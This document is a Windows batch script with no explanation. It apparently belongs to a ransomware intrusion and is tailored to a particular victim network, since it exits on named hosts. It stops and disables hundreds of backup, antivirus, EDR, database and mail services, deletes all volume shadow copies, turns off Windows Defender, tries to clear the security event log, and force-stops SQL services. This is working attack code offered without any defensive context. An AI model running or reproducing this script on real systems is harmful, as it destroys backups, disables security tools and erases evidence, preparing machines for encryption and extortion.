IF %computername% == DRYKGMDC EXIT
IF %computername% == YKGMDC01 EXIT
IF %computername% == YKGMDC02 EXIT
IF %computername% == YKGMDC3 EXIT
IF %computername% == DWINFBCKP01 EXIT
IF %computername% == GMBIM36 EXIT
net stop "Acronis VSS Provider" /y
net stop "SQLsafe Backup Service" /y
net stop "SQLsafe Filter Service" /y
net stop "Symantec System Recovery" /y
net stop "Veeam Backup Catalog Data Service" /y
net stop AcronisAgent /y
net stop AcrSch2Svc /y
net stop ARSM /y
net stop BackupExecAgentAccelerator /y
net stop BackupExecAgentBrowser /y
net stop BackupExecDeviceMediaService /y
net stop BackupExecJobEngine /y
net stop BackupExecManagementService /y
net stop BackupExecRPCService /y
net stop BackupExecVSSProvider /y
net stop bedbg /y
net stop DCAgent /y
net stop EPSecurityService /y
net stop EPUpdateService /y
net stop EraserSvc11710 /y
net stop EsgShKernel /y
net stop FA_Scheduler /y
net stop IISAdmin /y
net stop IMAP4Svc /y
net stop macmnsvc /y
net stop masvc /y
net stop MBAMService /y
net stop MBEndpointAgent /y
net stop MMS /y
net stop mozyprobackup /y
net stop MsDtsServer /y
net stop MsDtsServer100 /y
net stop MsDtsServer110 /y
net stop MSExchangeES /y
net stop MSExchangeIS /y
net stop MSExchangeMGMT /y
net stop MSExchangeMTA /y
net stop MSExchangeSA /y
net stop MSExchangeSRS /y
net stop MSOLAP$SQL_2008 /y
net stop MSOLAP$SYSTEM_BGC /y
net stop MSOLAP$TPS /y
net stop MSOLAP$TPSAMA /y
net stop MSSQL$BKUPEXEC /y
net stop MSSQL$ECWDB2 /y
net stop MSSQL$PRACTICEMGT /y
net stop MSSQL$PRACTTICEBGC /y
net stop MSSQL$PROFXENGAGEMENT /y
net stop MSSQL$SBSMONITORING /y
net stop MSSQL$SHAREPOINT /y
net stop MSSQL$SQL_2008 /y
net stop MSSQL$SYSTEM_BGC /y
net stop MSSQL$TPS /y
net stop MSSQL$TPSAMA /y
net stop MSSQL$VEEAMSQL2008R2 /y
net stop MSSQL$VEEAMSQL2012 /y
net stop MSSQLFDLauncher /y
net stop MSSQLFDLauncher$PROFXENGAGEMENT /y
net stop MSSQLFDLauncher$SBSMONITORING /y
net stop MSSQLFDLauncher$SHAREPOINT /y
net stop MSSQLFDLauncher$SQL_2008 /y
net stop MSSQLFDLauncher$SYSTEM_BGC /y
net stop MSSQLFDLauncher$TPS /y
net stop MSSQLFDLauncher$TPSAMA /y
net stop MSSQLSERVER /y
net stop MSSQLServerADHelper100 /y
net stop MSSQLServerOLAPService /y
net stop MySQL57 /y
net stop ntrtscan /y
net stop ASLogWatch /y
net stop CASAD2DWebSvc /y
net stop CAARCUpdateSvc /y
net stop OracleClientCache80 /y
net stop PDVFSService /y
net stop POP3Svc /y
net stop ReportServer /y
net stop ReportServer$SQL_2008 /y
net stop ReportServer$SYSTEM_BGC /y
net stop ReportServer$TPS /y
net stop ReportServer$TPSAMA /y
net stop RESvc /y
net stop sacsvr /y
net stop SamSs /y
net stop SDRSVC /y
net stop SepMasterService /y
net stop ShMonitor /y
net stop Smcinst /y
net stop SmcService /y
net stop SMTPSvc /y
net stop SNAC /y
net stop SntpService /y
net stop SQLAgent$BKUPEXEC /y
net stop SQLAgent$ECWDB2 /y
net stop SQLAgent$PRACTTICEBGC /y
net stop SQLAgent$PRACTTICEMGT /y
net stop SQLAgent$PROFXENGAGEMENT /y
net stop SQLAgent$SBSMONITORING /y
net stop SQLAgent$SHAREPOINT /y
net stop SQLAgent$SQL_2008 /y
net stop SQLAgent$SYSTEM_BGC /y
net stop SQLAgent$TPS /y
net stop SQLAgent$TPSAMA /y
net stop SQLAgent$VEEAMSQL2008R2 /y
net stop SQLAgent$VEEAMSQL2012 /y
net stop SQLBrowser /y
net stop SQLSafeOLRService /y
net stop SQLSERVERAGENT /y
net stop SQLTELEMETRY /y
net stop SQLTELEMETRY$ECWDB2 /y
net stop SQLWriter /y
net stop SstpSvc /y
net stop svcGenericHost /y
net stop swi_filter /y
net stop swi_service /y
net stop swi_update_64 /y
net stop TmCCSF /y
net stop tmlisten /y
net stop TrueKey /y
net stop TrueKeyScheduler /y
net stop TrueKeyServiceHelper /y
net stop UI0Detect /y
net stop VeeamBackupSvc /y
net stop VeeamBrokerSvc /y
net stop VeeamCatalogSvc /y
net stop VeeamCloudSvc /y
net stop VeeamDeploymentService /y
net stop VeeamDeploySvc /y
net stop VeeamEnterpriseManagerSvc /y
net stop VeeamMountSvc /y
net stop VeeamNFSSvc /y
net stop VeeamRESTSvc /y
net stop VeeamTransportSvc /y
net stop W3Svc /y
net stop wbengine /y
net stop WRSVC /y
net stop VeeamHvIntegrationSvc /y
net stop swi_update /y
net stop SQLAgent$CXDB /y
net stop SQLAgent$CITRIX_METAFRAME /y
net stop "SQL Backups" /y
net stop MSSQL$PROD /y
net stop "Zoolz 2 Service" /y
net stop MSSQLServerADHelper /y
net stop SQLAgent$PROD /y
net stop msftesql$PROD /y
net stop NetMsmqActivator /y
net stop EhttpSrv /y
net stop ESHASRV /y
net stop MSSQL$SOPHOS /y
net stop SQLAgent$SOPHOS /y
net stop MSSQL$SQLEXPRESS /y
net stop SQLAgent$SQLEXPRESS /y
net stop aswBcc /y
net stop Telemetryserver /y
net stop WdNisSvc /y
net stop WinDefend /y
net stop MSSQLFDLauncher$ITRIS /y
net stop MSSQL$EPOSERVER /y
net stop MSSQL$ITRIS /y
net stop SQLAgent$EPOSERVER /y
net stop SQLAgent$ITRIS /y
net stop SQLTELEMETRY$ITRIS /y
net stop SQLPBDMS /y
net stop SQLPBENGINE /y
net stop MSSQLFDLauncher /y
net stop SSASTELEMETRY /y
net stop "SQL Server Distributed Replay Client" /y
net stop "SQL Server Distributed Replay Controller" /y
net stop MsDtsServer150 /y
net stop SSISTELEMETRY150 /y
net stop SSISScaleOutMaster150 /y
net stop SSISScaleOutWorker150 /y
net stop MSSQLLaunchpad /y
net stop MsDtsServer130 /y
net stop SSISTELEMETRY130 /y
net stop MSSQLLaunchpad$ITRIS /y
net stop BITS /y
net stop BrokerInfrastructure /y
net stop epag /y
net stop EPIntegrationService /y
net stop EPProtectedService /y
net stop epredline /y
net stop LogProcessorService /y
net stop SentinelStaticEngine /y
net stop DB2 /y
net stop DB2GOVERNOR_DB2COPY1 /y
net stop DB2LICD_DB2COPY1 /y
net stop DB2MGMTSVC_DB2COPY1 /y
net stop DB2REMOTECMD_DB2COPY1 /y
net stop DB2DAS00 /y
net stop DB2-0 /y
net stop DB2INST2 /y
net stop IBMDataServerMgr /y
net stop IBMDSServer41 /y
net stop MSSQL$CITRIX_METAFRAME /y
net stop RumorServer /y
net stop myAgtSvc /y
sc config LogProcessorService start= disabled
sc config TmPfw start= disable
sc config EPSecurityService start= disable
sc config EPUpdateService start= disable
sc config epredline start= disable
sc config EPProtectedService start= disable
sc config EPIntegrationService start= disable
sc config epag start= disable
sc config BITSstart= disabled
sc config BrokerInfrastructurestart= disabled
sc config EPSecurityServicestart= disabled
sc config EPUpdateServicestart= disabled
sc config MSSQLLaunchpad$ITRIS start= disabled
sc config SSISTELEMETRY130 start= disabled
sc config MsDtsServer130 start= disabled
sc config SQLTELEMETRY$ITRIS start= disabled
sc config SQLAgent$ITRIS start= disabled
sc config SQLAgent$EPOSERVER start= disabled
sc config MSSQL$ITRIS start= disabled
sc config MSSQL$EPOSERVER start= disabled
sc config MSSQLFDLauncher$ITRIS start= disabled
sc config MCAFEEEVENTPARSERSRV start= disabled
sc config MCAFEETOMCATSRV530 start= disabled
sc config WdNisSvc start= disabled
sc config Telemetryserver start= disabled
sc config aswBcc start= disabled
sc config wbengine start= disabled
sc config SQLAgent$SQLEXPRESS start= disabled
sc config MSSQL$SQLEXPRESS start= disabled
sc config EhttpSrv start= disabled
sc config ESHASRV start= disabled
sc config NetMsmqActivator start= disabled
sc config msftesql$PROD start= disabled
sc config SQLAgent$PROD start= disabled
sc config MSSQLServerADHelper start= disabled
sc config "Zoolz 2 Service" start= disabled
sc config MSSQL$PROD start= disabled
sc config "SQL Backups" start= disabled
sc config SQLAgent$CITRIX_METAFRAME start= disabled
sc config "Acronis VSS Provider" start= disabled
sc config "Enterprise Client Service" start= disabled
sc config "SQLsafe Backup Service" start= disabled
sc config "SQLsafe Filter Service" start= disabled
sc config "McAfeeDLPAgentService" start= disabled
sc config "Symantec System Recovery" start= disabled
sc config "Veeam Backup Catalog Data Service" start= disabled
sc config AcronisAgent start= disabled
sc config AcrSch2Svc start= disabled
sc config ARSM start= disabled
sc config BackupExecAgentAccelerator start= disabled
sc config BackupExecAgentBrowser start= disabled
sc config BackupExecDeviceMediaService start= disabled
sc config BackupExecJobEngine start= disabled
sc config BackupExecManagementService start= disabled
sc config BackupExecRPCService start= disabled
sc config BackupExecVSSProvider start= disabled
sc config bedbg start= disabled
sc config DCAgent start= disabled
sc config EPSecurityService start= disabled
sc config EPUpdateService start= disabled
sc config EraserSvc11710 start= disabled
sc config EsgShKernel start= disabled
sc config FA_Scheduler start= disabled
sc config IISAdmin start= disabled
sc config IMAP4Svc start= disabled
sc config macmnsvc start= disabled
sc config masvc start= disabled
sc config MBAMService start= disabled
sc config MBEndpointAgent start= disabled
sc config MMS start= disabled
sc config mozyprobackup start= disabled
sc config MsDtsServer start= disabled
sc config MsDtsServer100 start= disabled
sc config MsDtsServer110 start= disabled
sc config MSExchangeES start= disabled
sc config MSExchangeIS start= disabled
sc config MSExchangeMGMT start= disabled
sc config MSExchangeMTA start= disabled
sc config MSExchangeSA start= disabled
sc config MSExchangeSRS start= disabled
sc config MSOLAP$SQL_2008 start= disabled
sc config MSOLAP$SYSTEM_BGC start= disabled
sc config MSOLAP$TPS start= disabled
sc config MSOLAP$TPSAMA start= disabled
sc config MSSQL$BKUPEXEC start= disabled
sc config MSSQL$ECWDB2 start= disabled
sc config MSSQL$PRACTICEMGT start= disabled
sc config MSSQL$PRACTTICEBGC start= disabled
sc config MSSQL$PROFXENGAGEMENT start= disabled
sc config MSSQL$SBSMONITORING start= disabled
sc config MSSQL$SHAREPOINT start= disabled
sc config MSSQL$SQL_2008 start= disabled
sc config MSSQL$SYSTEM_BGC start= disabled
sc config MSSQL$TPS start= disabled
sc config MSSQL$TPSAMA start= disabled
sc config MSSQL$VEEAMSQL2008R2 start= disabled
sc config MSSQL$VEEAMSQL2012 start= disabled
sc config MSSQLFDLauncher start= disabled
sc config MSSQLFDLauncher$PROFXENGAGEMENT start= disabled
sc config MSSQLFDLauncher$SBSMONITORING start= disabled
sc config MSSQLFDLauncher$SHAREPOINT start= disabled
sc config MSSQLFDLauncher$SQL_2008 start= disabled
sc config MSSQLFDLauncher$SYSTEM_BGC start= disabled
sc config MSSQLFDLauncher$TPS start= disabled
sc config MSSQLFDLauncher$TPSAMA start= disabled
sc config MSSQLSERVER start= disabled
sc config MSSQLServerADHelper100 start= disabled
sc config MSSQLServerOLAPService start= disabled
sc config MySQL57 start= disabled
sc config ntrtscan start= disabled
sc config OracleClientCache80 start= disabled
sc config PDVFSService start= disabled
sc config POP3Svc start= disabled
sc config ReportServer start= disabled
sc config ReportServer$SQL_2008 start= disabled
sc config ReportServer$SYSTEM_BGC start= disabled
sc config ReportServer$TPS start= disabled
sc config ReportServer$TPSAMA start= disabled
sc config RESvc start= disabled
sc config sacsvr start= disabled
sc config SamSs start= disabled
sc config SDRSVC start= disabled
sc config SepMasterService start= disabled
sc config ShMonitor start= disabled
sc config Smcinst start= disabled
sc config SmcService start= disabled
sc config SMTPSvc start= disabled
sc config SNAC start= disabled
sc config SntpService start= disabled
sc config SQLAgent$BKUPEXEC start= disabled
sc config SQLAgent$ECWDB2 start= disabled
sc config SQLAgent$PRACTTICEBGC start= disabled
sc config SQLAgent$PRACTTICEMGT start= disabled
sc config SQLAgent$PROFXENGAGEMENT start= disabled
sc config SQLAgent$SBSMONITORING start= disabled
sc config SQLAgent$SHAREPOINT start= disabled
sc config SQLAgent$SQL_2008 start= disabled
sc config SQLAgent$SYSTEM_BGC start= disabled
sc config SQLAgent$TPS start= disabled
sc config SQLAgent$TPSAMA start= disabled
sc config SQLAgent$VEEAMSQL2008R2 start= disabled
sc config SQLAgent$VEEAMSQL2012 start= disabled
sc config SQLBrowser start= disabled
sc config SQLSafeOLRService start= disabled
sc config SQLSERVERAGENT start= disabled
sc config SQLTELEMETRY start= disabled
sc config SQLTELEMETRY$ECWDB2 start= disabled
sc config SQLWriter start= disabled
sc config SQLPBDMS start= disabled
sc config SQLPBENGINE start= disabled
sc config MSSQLFDLauncher start= disabled
sc config SSASTELEMETRY start= disabled
sc config "SQL Server Distributed Replay Client" start= disabled
sc config "SQL Server Distributed Replay Controller" start= disabled
sc config MsDtsServer150 start= disabled
sc config SSISTELEMETRY150 start= disabled
sc config SSISScaleOutMaster150 start= disabled
sc config SSISScaleOutWorker150 start= disabled
sc config MSSQLLaunchpad start= disabled
sc config SstpSvc start= disabled
sc config svcGenericHost start= disabled
sc config swi_filter start= disabled
sc config swi_service start= disabled
sc config swi_update_64 start= disabled
sc config TmCCSF start= disabled
sc config tmlisten start= disabled
sc config TrueKey start= disabled
sc config TrueKeyScheduler start= disabled
sc config TrueKeyServiceHelper start= disabled
sc config UI0Detect start= disabled
sc config VeeamBackupSvc start= disabled
sc config VeeamBrokerSvc start= disabled
sc config VeeamCatalogSvc start= disabled
sc config VeeamCloudSvc start= disabled
sc config VeeamDeploymentService start= disabled
sc config VeeamDeploySvc start= disabled
sc config VeeamEnterpriseManagerSvc start= disabled
sc config VeeamMountSvc start= disabled
sc config VeeamNFSSvc start= disabled
sc config VeeamRESTSvc start= disabled
sc config VeeamTransportSvc start= disabled
sc config W3Svc start= disabled
sc config WRSVC start= disabled
sc config VeeamHvIntegrationSvc start= disabled
sc config swi_update start= disabled
sc config SQLAgent$CXDB start= disabled
sc config MSSQL$CITRIX_METAFRAME start= disabled
sc config IBMDSServer41 start= disabled
sc config IBMDataServerMgr start= disabled
sc config DB2INST2 start= disabled
sc config DB2-0 start= disabled
sc config DB2DAS00 start= disabled
sc config DB2REMOTECMD_DB2COPY1 start= disabled
sc config DB2MGMTSVC_DB2COPY1 start= disabled
sc config DB2LICD_DB2COPY1 start= disabled
sc config DB2GOVERNOR_DB2COPY1 start= disabled
sc config DB2 start= disabled
sc config Alerter start= disabled
sc config ERSvc start= disabled
sc config Eventlog start= disabled
sc config ImapiService start= disabled
sc config NetDDE start= disabled
sc config NtLmSsp start= disabled
sc config NtmsSvc start= disabled
sc config odserv start= disabled
sc config ose start= disabled
sc config SnowInventoryClient start= disabled
sc config TlntSvr start= disabled
sc config TSM start= disabled
sc config VMTools start= disabled
sc config VMware start= disabled
sc config WebClient start= disabled
sc config WinVNC4 start= disabled
sc config BlueStripeCollector start= disabled
sc config ASLogWatch start= disabled
sc config CASAD2DWebSvc start= disabled
sc config CAARCUpdateSvc start= disabled
sc config Cissesrv start= disabled
sc config CpqRcmc3 start= disabled
sc config gupdate start= disabled
sc config gupdatem start= disabled
sc config HealthService start= disabled
sc config NimbusWatcherService start= disabled
sc config ProLiantMonitor start= disabled
sc config SDD_Service start= disabled
sc config sysdown start= disabled
sc config System start= disabled
sc config GoogleChromeElevationService start= disabled
sc config bcrservice start= disabled
sc config ccEvtMgr start= disabled
sc config ccSetMgr start= disabled
sc config CSAdmin start= disabled
sc config CSAuth start= disabled
sc config CSDbSync start= disabled
sc config CSLog start= disabled
sc config CSMon start= disabled
sc config CSRadius start= disabled
sc config CSTacacs start= disabled
sc config Symantec start= disabled
sc config VGAuthService start= disabled
sc config SepMasterServiceMig start= disabled
sc config avbackup start= disabled
sc config MSSQL$NET2 start= disabled
sc config Net2ClientSvc start= disabled
sc config NetSvc start= disabled
sc config SQLAgent$NET2 start= disabled
sc config tpautoconnsvc start= disabled
sc config TPVCGateway start= disabled
sc config TPAutoConnSvc start= disabled
sc config AdobeARMservice start= disabled
sc config RSCDsvc start= disabled
sc config LRSDRVX start= disabled
sc config msvsmon90 start= disabled
sc config IDriverT start= disabled
sc config MSMQ  start= disabled
net stop Alerter /y
net stop ERSvc /y
net stop Eventlog /y
net stop ImapiService /y
net stop NetDDE /y
net stop NtLmSsp /y
net stop NtmsSvc /y
net stop odserv /y
net stop ose /y
net stop SnowInventoryClient /y
net stop TlntSvr /y
net stop TSM /y
net stop WebClient /y
net stop WinVNC4 /y
net stop BlueStripeCollector /y
net stop Cissesrv /y
net stop CpqRcmc3 /y
net stop gupdate /y
net stop gupdatem /y
net stop HealthService /y
net stop NimbusWatcherService /y
net stop ProLiantMonitor /y
net stop SDD_Service /y
net stop sysdown /y
net stop System /y
net stop GoogleChromeElevationService /y
net stop bcrservice /y
net stop ccEvtMgr /y
net stop ccSetMgr /y
net stop CSAdmin /y
net stop CSAuth /y
net stop CSDbSync /y
net stop CSLog /y
net stop CSMon /y
net stop CSRadius /y
net stop CSTacacs /y
net stop VGAuthService /y
net stop SepMasterServiceMig /y
net stop avbackup /y
net stop MSSQL$NET2 /y
net stop Net2ClientSvc /y
net stop NetSvc /y
net stop SQLAgent$NET2 /y
net stop tpautoconnsvc /y
net stop TPVCGateway /y
net stop TPAutoConnSvc /y
net stop AdobeARMservice /y
net stop RSCDsvc /y
net stop LRSDRVX /y
net stop msvsmon90 /y
net stop IDriverT /y
net stop MSMQ /y
net stop SQLTELEMETRY$COMPUTECLUSTER /y
net stop Ark_Host_Service /y
vssadmin.exe delete shadows /all /quiet
reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
wevtutil.exe cl sercurity
powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true
powershell.exe Stop-Service -Name "*sql*" -Force
